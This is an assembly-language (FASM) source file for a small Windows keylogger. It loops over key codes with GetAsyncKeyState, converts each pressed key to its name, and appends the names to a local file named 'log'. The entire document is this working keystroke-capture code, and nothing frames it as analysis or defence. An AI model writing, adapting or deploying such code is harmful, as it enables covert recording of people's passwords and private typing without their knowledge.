format PE console

INCLUDE 'win32ax.inc'

section '.idata' import data readable writeable
    library kernel32, 'kernel32.dll', user32, 'user32.dll'

    import kernel32, Sleep, 'Sleep', CreateFile, 'CreateFileA', WriteFile, 'WriteFile', SetFilePointer, 'SetFilePointer', lstrlen, 'lstrlenA', CloseHandle, 'CloseHandle', ExitProcess, 'ExitProcess'
    import user32, GetAsyncKeyState, 'GetAsyncKeyState', MapVirtualKeyA, 'MapVirtualKeyA', GetKeyNameTextA, 'GetKeyNameTextA'

.code
Start:
    mov esi, 7 ; skips mouse buttons
    invoke Sleep, 1 ; wait, save system resources

CheckState: ; brute force check button states
    cmp esi, 255
    je Start
    inc esi ; move to next button
    invoke GetAsyncKeyState, esi ; getstate
    cmp eax, 0 ; check if clicked
    jnz Mapit
    jmp CheckState ; 
Mapit:
    invoke MapVirtualKeyA, esi, 0
    shl eax, 16 ; GetKeyName requires the argument to start at bit 16
    invoke GetKeyNameTextA, eax, buf, 512
    invoke CreateFile, log, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
    
    cmp eax, 0
    je Exit ; case failure
    mov dword [fileHandle], eax ; save handle
    mov ebx, eax
    
    invoke SetFilePointer, ebx, 0, 0, FILE_END ; set fd to the end of file
    invoke  lstrlen, buf
    mov ebx, dword [fileHandle]
    invoke WriteFile, ebx, buf, eax, bytesWritten, NULL
    
    invoke CloseHandle, ebx
    invoke Sleep, 150 ; handles keypress force
    jmp CheckState
Exit:
    mov ebx, dword [fileHandle]
    invoke CloseHandle, ebx
    invoke ExitProcess, 0

.data
    log db "log", 0
    bytesWritten dd 0
    buf rb 512
    fileHandle dq 0


